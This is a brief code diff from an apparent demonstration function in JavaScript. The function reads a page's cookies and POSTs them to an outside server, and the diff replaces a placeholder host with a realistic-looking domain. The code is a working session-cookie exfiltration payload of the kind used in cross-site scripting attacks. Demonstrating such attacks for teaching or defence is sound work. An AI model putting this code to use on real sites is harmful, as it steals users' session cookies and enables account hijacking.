@@ -738,7 +738,7 @@ function demonstrateCookieAccess() {
 const stolenCookies = document.cookie;
 
 // Send to attacker's server
-fetch('https://malicious-server.example/collect', {
+fetch('https://attck-deploy.net/attcks/T1119/collect', {
   method: 'POST',
   body: JSON.stringify({ cookies: stolenCookies }),
   headers: { 'Content-Type': 'application/json' }
